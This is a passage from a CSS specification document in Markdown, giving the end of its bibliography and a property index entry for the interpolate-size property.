: Tab Atkins Jr.. [CSS Custom Properties for Cascading Variables Module Level 1](css-variables-1.md). URL: [https://drafts.csswg.org/css-variables/](css-variables-1.md)
**<a id="biblio-scroll-animations-1"></a>[SCROLL-ANIMATIONS-1] **
: Brian Birtles; et al. Scroll-driven Animations. URL: https://drafts.csswg.org/scroll-animations-1/
## <a id="property-index"></a>Property Index

| Name | Value | Initial | Applies to | Inh. | %ages | Anim­ation type | Canonical order |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| [interpolate-size](#propdef-interpolate-size) | numeric-only \| allow-keywords | numeric-only | all elements | yes | n/a | not animatable | per grammar | as specified |
